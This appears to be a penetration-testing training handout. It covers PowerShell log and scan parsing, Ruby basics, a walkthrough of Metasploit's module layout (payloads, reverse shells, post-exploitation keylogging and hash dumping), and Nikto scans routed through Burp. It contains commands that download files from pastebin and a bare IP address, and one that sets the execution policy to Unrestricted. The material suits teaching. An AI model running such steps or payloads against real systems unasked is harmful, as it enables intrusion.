+------------------------Type This------------------------------
+$seclog.Count
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+------------------------Type This------------------------------
+mkdir c:\ps
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+---------------------------------------------------------------
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+---------------------------------------------------------------
+ 
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+---------------------------------------------------------------
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+---------------------------------------------------------------
+ 
+ 
+ 
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+ 
+Download the sample IIS log http://pastebin.com/LBn64cyA
+ 
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+---------------------------------------------------------------
+ 
+ 
+The above command would give us all the WebDAV requests.
+ 
+To filter this to a particular user name, use the below command:
+------------------------Type This------------------------------
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+---------------------------------------------------------------
+ 
+ 
+Some more options that will be more commonly required :
+ 
+For Outlook Web Access : Replace WebDAV with OWA
+ 
+For EAS : Replace WebDAV with Microsoft-server-activesync
+ 
+For ECP : Replace WebDAV with ECP
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+####################################################################
+# Windows PowerShell: Extracting Strings Using Regular Expressions #
+####################################################################
+ 
+ 
+Regex Characters you might run into:
+ 
+^   Start of string, or start of line in a multiline pattern
+$   End  of string, or start of line in a multiline pattern
+\b  Word boundary
+\d  Digit
+\   Escape the following character
+*   0 or more   {3} Exactly 3
++   1 or more   {3,}    3 or more
+?   0 or 1      {3,5}   3, 4 or 5
+ 
+ 
+ 
+To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:
+ 
+1) The input file that will be parsed
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
+---------------------------------------------------------------
+2) The regular expression that the input file will be compared against
+ 
+3) The output file for where the extracted data will be placed.
+ 
+Windows PowerShell has a "select-string" cmdlet which can be used to quickly scan a file to see if a certain string value exists.
+Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.
+ 
+To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\emails.txt'
+$output_file = 'c:\ps\extracted_addresses.txt'
+$regex = '\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+In this script, we have the following variables:
+ 
+1) $input_path to hold the path to the input file we want to parse
+ 
+2) $output_file to hold the path to the file we want the results to be stored in
+ 
+3) $regex to hold the regular expression pattern to be used when the strings are being matched.
+ 
+The select-string cmdlet contains various parameters as follows:
+ 
+1) "-Path" which takes as input the full path to the input file
+ 
+2) "-Pattern" which takes as input the regular expression used in the matching process
+ 
+3) "-AllMatches" which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to "$.Matches" and then "$_.Value" which represent using the current values of all the matches.
+ 
+Using ">" the results are written to the destination specified in the $output_file variable.
+ 
+Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.
+ 
+IP addresses
+------------
+For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\ip_addresses.txt'
+$output_file = 'c:\ps\extracted_ip_addresses.txt'
+$regex = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+ 
+URLs
+----
+For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt.
+You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\URL_addresses.txt'
+$output_file = 'c:\ps\extracted_URL_addresses.txt'
+$regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+In addition to the examples above, many other types of strings can be extracted using this script.
+All you need to do is switch the regular expression in the "$regex" variable!
+In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.
+ 
+ 
+ 
+##########################
+# Parsing Nmap XML Files #
+##########################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+http://45.63.104.73/PowerShell-Files.zip
+ 
+ 
+ 
+ 
+Run Powershell as administrator
+------------------------Type This------------------------------
+cd C:\ps\
+ 
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+---------------------------------------------------------------
+ 
+ 
+Parse nmap XML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml
+---------------------------------------------------------------
+ 
+ 
+Process all XML files
+------------------------Type This------------------------------
+.\parse-nmap.ps1 *.xml
+---------------------------------------------------------------
+ 
+Piping also works
+------------------------Type This------------------------------
+dir *.xml | .\parse-nmap.ps1
+---------------------------------------------------------------
+ 
+Advanced parsing with filtering conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
+---------------------------------------------------------------
+ 
+ 
+More parsing
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
+---------------------------------------------------------------
+ 
+Parsing with match and multiple conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
+---------------------------------------------------------------
+ 
+ 
+CSV Export
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
+---------------------------------------------------------------
+ 
+Import Data from CSV
+------------------------Type This------------------------------
+$data = import-csv weblisteners.csv
+$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
+---------------------------------------------------------------
+ 
+ 
+Export to HTML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
+---------------------------------------------------------------
+ 
+ 
+########################################
+# Parsing Nessus scans with PowerShell #
+########################################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+http://45.63.104.73/PowerShell-Files.zip
+ 
+ 
+ 
+Let's take a look at the Import-Csv cmdlet and what are the members of the object it returns:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | Get-Member
+---------------------------------------------------------------
+ 
+filter the objects:
+ 
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {$_.risk -eq "high"}
+---------------------------------------------------------------
+ 
+use the Select-Object cmdlet and only get unique entries:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique
+ 
+Import-Csv C:\ps\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
+------------------------Type This------------------------------
+ 
+ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
+---------------------------------------------------------------
+
+
+
+
+#################################################
+# Ruby Fundamentals and Metasploit Architecture #
+#################################################
+ 
+############################
+# Day 4: Ruby Fundamentals #
+############################
+ 
+ 
+ 
+- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
+scientist and programmer from Japan. It is a cross-platform dynamic language.
+ 
+- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
+on Rails is a framework that is written in Ruby.
+ 
+- Ruby's file name extensions are .rb and .rbw.
+ 
+- official website of this
+ 
+- language: www.ruby-lang.org.
+ 
+ 
+- interactive Shell called Ruby Shell
+ 
+ 
+- Installing and Running IRB
+ 
+---------------------------Type This-----------------------------------
+ruby -v
+-----------------------------------------------------------------------
+ 
+ 
+If you don't have ruby2.3 use the commands below:
+-----------------------------------------------------------------------
+sudo apt-get install ruby2.3 ruby2.3-dev ruby2.3-doc irb rdoc ri
+-----------------------------------------------------------------------
+ 
+- open up the interactive console and play around.
+ 
+---------------------------Type This-----------------------------------
+irb
+-----------------------------------------------------------------------
+ 
+ 
+- Math, Variables, Classes, Creating Objects and Inheritance
+ 
+ 
+The following arithmetic operators:
+    Addition operator (+) — 10 + 23
+    Subtraction operator (-) — 1001 - 34
+    Multiplication operator (*) — 5 * 5
+    Division operator (/) — 12 / 2
+ 
+ 
+ 
+- Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
+operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
+30. Again, 69 is assigned to y, and then y is incremented by 33.
+ 
+---------------------------Type This-----------------------------------
+x = 25
+x + 30
+y = 69
+y+33
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Let's look at creating classes and creating objects.
+ 
+- Here, the name of the class is Attack. An object has its properties and methods.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Attack
+attr_accessor :of, :sqli, :xss
+end
+-----------------------------------------------------------------------
+ 
+ 
+What is nil?
+Reference:
+https://www.codecademy.com/en/forum_questions/52a112378c1cccb0f6001638
+ 
+nil is the Ruby object that represents nothingness. Whenever a method doesn’t return a useful value, it returns nil. puts and print are methods that return nil:
+ 
+Since the Ruby Console always shows the value of the last statement or expression in your code, if that last statement is print, you’ll see the nil.
+ 
+To prevent the nil from "sticking" to the output of print (which doesn’t insert a line break), you can print a line break after it, and optionally put some other value as the last statement of your code, then the Console will show it instead of nil:
+ 
+ 
+ 
+ 
+ 
+# Now that we have created the classes let's create the objects
+---------------------------Type This-----------------------------------
+first_attack = Attack.new
+first_attack.of = "stack"
+first_attack.sqli = "blind"
+first_attack.xss = "dom"
+puts first_attack.of
+puts first_attack.sqli
+puts first_attack.xss
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
+inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
+one object can access the properties/attributes of another object of a different class. Inheritance makes your
+programming life easier by maximizing code reuse.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Exploitframeworks
+attr_accessor :scanners, :exploits, :shellcode, :postmodules
+end
+class Metasploit < Exploitframeworks
+end
+class Canvas < Exploitframeworks
+end
+class Coreimpact < Exploitframeworks
+end
+class Saint < Exploitframeworks
+end
+class Exploitpack < Exploitframeworks
+end
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
+ 
+- Let's create a simple method. A method is used to perform an action and is generally called with an object.
+ 
+- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
+it will print this string: "We are Learning how to PenTest"
+ 
+- An object named 'bo' is created, which is used to call the method.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Msfnl
+def learning
+puts "We are Learning how to PenTest"
+end
+end
+-----------------------------------------------------------------------
+ 
+#Now let's define an object for our Method
+ 
+---------------------------Type This-----------------------------------
+joe = Msfnl.new
+joe.learning
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- An argument is a value or variable that is passed to the function while calling it. In the following example, while
+calling the puts() function, we are sending a string value to the function. This string value is used by the
+function to perform some particular operations.
+ 
+puts ("Pentesting")
+ 
+ 
+- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will
+explain some useful string functions with an example.
+ 
+- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the
+reverse function reverses a string. The following example demonstrates how to use the string functions.
+ 
+---------------------------Type This-----------------------------------
+55.class
+"I Love Programming".class
+"I Love Pentesting".length
+"Pown that box".upcase
+"Love" + "To Root Boxes"
+"evil".reverse
+"evil".reverse.upcase
+-----------------------------------------------------------------------
+ 
+ 
+-  expressions and shortcuts. In the below example, 'a' is an operand, '3' is an operand,  '=' is
+an operator, and 'a=3' is the expression. A statement consists of one or multiple expressions. Following are the
+examples of some expressions.
+ 
+---------------------------Type This-----------------------------------
+a = 3
+b = 6
+a+b+20
+d = 44
+f = d
+puts f
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
+assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
+statements to understand the shortcuts.
+ 
+---------------------------Type This-----------------------------------
+g = 70
+g = g+44
+g += 33
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is incremented by 33 and then the total value is assigned to g.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+g *= 3
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is multiplied with 3 and then assigned to g.
+ 
+- Example
+ 
+- Comparison Operators, Loops, Data Types, and Constants
+ 
+- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
+how to use the following comparison operators.
+ 
+'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
+variable or constant. If it's less than the other, the 'less than' operator returns true.
+ 
+'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
+or constant. If it's equal to the other, the 'equal to' operator returns true.
+ 
+'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
+variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
+ 
+---------------------------Type This-----------------------------------
+numberofports = 55
+puts "number of ports found during scan" if numberofports < 300
+numberofports = 400
+puts "number of ports found during scan" if numberofports < 300
+puts "number of ports found during scan" if numberofports == 300
+puts "number of ports found during scan" if numberofports != 300
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Example
+ 
+ 
+- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
+ 
+- This operator is generally used to combine multiple conditions.
+- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
+ 
+- following example to understand how this operator works.
+ 
+---------------------------Type This-----------------------------------
+ports = 100
+puts "number of ports found on the network" if ports<100 || ports>200
+puts "number of ports found on the network" if ports<100 || ports>75
+-----------------------------------------------------------------------
+ 
+# unless
+ 
+---------------------------Type This-----------------------------------
+portsbelow1024 = 50
+puts "If the ports are below 1024" unless portsbelow1024 < 1000
+puts "If the ports are below 1024" unless portsbelow1024 < 1055
+puts "If the ports are below 1024" unless portsbelow1024 < 20
+-----------------------------------------------------------------------
+ 
+- The 'unless' keyword is used to do something programmatically unless a condition is true.
+ 
+ 
+ 
+- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
+ 
+- See the following example to understand how a string is printed 10 times on the screen using a loop.
+ 
+---------------------------Type This-----------------------------------
+10.times do puts "infosecaddicts" end
+-----------------------------------------------------------------------
+ 
+# Or use the curly braces
+ 
+---------------------------Type This-----------------------------------
+10.times {puts "infosecaddicts"}
+-----------------------------------------------------------------------
+ 
+ 
+- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
+working with different data types. Data type conversion is also known as type casting.
+ 
+ 
+ 
+- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
+change the value of a constant, you will see a warning message.
+ 
+ 
+ 
+ 
+- Multiple Line String Variable, Interpolation, and Regular Expressions
+ 
+- A multiple line string variable lets you assign the value to the string variable through multiple lines.
+ 
+---------------------------Type This-----------------------------------
+infosecaddicts = <<mark
+welcome
+to the
+best
+metasploit
+course
+on the
+market
+mark
+puts infosecaddicts
+-----------------------------------------------------------------------
+ 
+ 
+- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
+it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
+Examine the following example to understand how interpolation works in Ruby.
+ 
+References:
+https://stackoverflow.com/questions/10869264/meaning-of-in-ruby
+ 
+ 
+---------------------------Type This-----------------------------------
+a = 4
+b = 6
+puts "a * b = a*b"
+puts " #{a} * #{b} = #{a*b} "
+person = "Joe McCray"
+puts "IT Security consultant person"
+puts "IT Security consultant #{person}"
+-----------------------------------------------------------------------
+ 
+- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
+ 
+ 
+ 
+ 
+ 
+- Character classes
+---------------------------Type This-----------------------------------
+infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
+"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
+"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
+-----------------------------------------------------------------------
+ 
+ 
+- Arrays, Push and Pop, and Hashes
+ 
+ 
+- In the following example, numbers is an array that holds 6 integer numbers.
+ 
+ 
+---------------------------Type This-----------------------------------
+numbers = [2,4,6,8,10,100]
+puts numbers[0]
+puts numbers[4]
+numbers[2] = 150
+puts numbers
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
+ 
+ 
+---------------------------Type This-----------------------------------
+framework = []
+framework << "modules"
+framework << "exploits"
+framework << "payloads"
+framework.pop
+framework.shift
+-----------------------------------------------------------------------
+ 
+- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
+that is used to access the element.
+ 
+ 
+- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
+In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
+respective values: 'what module should you use', 'Windows XP' and 'SSH'.
+ 
+---------------------------Type This-----------------------------------
+metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
+print metasploit.size
+print metasploit["microsoft"]
+metasploit['microsoft'] = 'redhat'
+print metasploit['microsoft']
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Writing Ruby Scripts
+ 
+ 
+- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
+this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
+someone made to look for a specific port. The port that it is looking for is port 21 FTP.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------
+
+
+
+###########################
+# Metasploit Fundamentals #
+###########################
+ 
+- Let's take a little look at Metasploit Framework
+ 
+- First, we should take note of the different directories, the Modular Architecture.
+ 
+The modules that make up the Modular Architecture are
+Exploits
+Auxiliary
+Payload
+Encoder
+Nops
+ 
+ 
+Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
+ 
+are
+ 
+Modules
+Scripts
+Plugins
+External
+Data
+Tools
+ 
+- Let's take a look inside the Metasploit directory and see what's the
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now let's take a look inside the Modules directory and see what's there.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules
+ls
+-----------------------------------------------------------------------
+ 
+       
+The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
+not necessarily need to - have a shell or session started on a machine.
+ 
+The exploits directory has our modules that we need to pop a shell on a box.
+The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
+like Burp Suite
+- Let's take a look at the external directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/external
+ls
+-----------------------------------------------------------------------
+ 
+- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data
+ls
+-----------------------------------------------------------------------
+ 
+- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
+brute-forcing
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/wordlists
+ls
+-----------------------------------------------------------------------
+ 
+- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
+once a session is created.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/meterpreter
+ls
+-----------------------------------------------------------------------
+ 
+- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
+like escalating privileges and dumping hashes.
+ 
+These are being phased out, though, and post-exploitation modules are what is being more preferred.
+The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
+find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
+for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
+custom shellcode.
+ 
+The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
+to do with other programs to make things like importing and exporting reports simple.
+Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
+the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
+modules we're going to have a better understanding of where everything needs to go.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/exploits
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- The exploits directory is split up into several different directories, each one housing exploits for different types
+of systems. I.E. Windows, Unix, OSX, dialup and so on.
+Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
+into categories of different types of services/programs, so that you can pick out an exploit specifically for the
+service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
+for us.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/
+ls
+-----------------------------------------------------------------------      
+ 
+ 
+- And a little further into the directory, let's take a look at what's in the scanner directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- And one more folder deeper into the structure, let's take a look in the portscan folder
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------    
+ 
+- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
+and report them back to us in a nice, easily readable format.
+ 
+cat tcp.rb
+   
+ 
+ 
+- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
+once you have a session on a machine.
+Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
+succeeds.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/payloads/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
+application for it to be used as.
+Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
+do everything once you have that shell calling back to you.
+Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
+the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
+much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
+to download Stages payloads.
+ 
+ 
+- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
+shells.
+---------------------------Type This-----------------------------------
+cd singles
+cd windows
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
+see what it actually does.
+---------------------------Type This-----------------------------------
+cat adduser.rb
+-----------------------------------------------------------------------
+ 
+Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
+the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
+it gives Windows to add the user to the system.
+ 
+ 
+- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
+ 
+windows/shell/bind_tcp or windows/shell/reverse_tcp
+---------------------------Type This-----------------------------------
+cd ../../stagers
+ls
+-----------------------------------------------------------------------
+   
+ 
+ 
+- Again, we can see that we have stagers for multiple systems and code types.
+---------------------------Type This-----------------------------------
+ls windows/
+-----------------------------------------------------------------------    
+ 
+ 
+As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
+machine, so we can upload or download our stage payloads and execute commands.
+Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
+our stagers...
+---------------------------Type This-----------------------------------
+cd ../stages
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Again, we can see that our stages are coded for particular operating systems and languages.
+We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
+victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
+if any.
+ 
+- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
+already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
+so we can impersonate other users on the system in hopes of elevating our privileges.
+---------------------------Type This-----------------------------------
+cd ../../../post/
+ls
+cd windows/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
+the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
+escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
+possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
+memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
+
+
+                            ##############################
+----------- ############### # Day 5: Advanced Burp Suite  ################ -----------
+                            ##############################
+
+Taking Burp to the next level:
+
+Burp Process:
+https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/#testing-for-alternative-content
+
+Web App Security Target Test websites:
+http://zero.webappsecurity.com/
+http://demo.testfire.net/
+http://www.webscantest.com/
+
+
+###################
+# Nikto with Burp #
+# in Linux        #
+###################
+ 
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto -h http://zero.webappsecurity.com -useproxy http://localhost:8080/
+ 
+-----------------
+Masking the Nikto header reference:
+http://carnal0wnage.attackresearch.com/2009/09/btod-nikto-thru-burp-masking-nikto.html
+
+Burp WSDL testing:
+https://nileshsapariya.blogspot.com/2017/05/auditing-soap-web-services-with.html
+https://developer.salesforce.com/forums/?id=906F0000000Az9mIAC
+
+SoapUI Testing:
+https://www.soapui.org/security-testing/getting-started.html
+
+API Testing:
+https://www.redteamsecure.com/api-enumeration-with-redteam-securitys-tool-purl/
+
+
+References:
+https://2015.appsec.eu/wp-content/uploads/2015/09/owasp-appseceu2015-haddix.pdf
